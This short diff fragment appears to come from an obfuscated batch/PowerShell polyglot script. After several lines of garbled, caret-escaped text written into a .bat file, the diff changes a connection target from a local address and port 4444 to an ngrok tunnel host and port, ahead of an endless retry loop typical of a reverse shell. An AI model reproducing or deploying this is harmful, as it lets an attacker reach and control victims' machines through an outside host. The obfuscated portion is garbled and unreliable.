@@ -30,8 +30,8 @@ yÈh yÈh            yÈh        while N»^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£
 yÈh yÈh            yÈh            try^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
 yÈh yÈh            yÈh                ¢ëiº = os.­æ^^^^(p.²×hº.~)^^^^^(^^^^), ×M¸^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
 #>
-$ip = "192.168.1.16"
-$port = 4444
+$ip = "7.tcp.eu.ngrok.io"
+$port = 13153
 
 while ($true) {
     try {
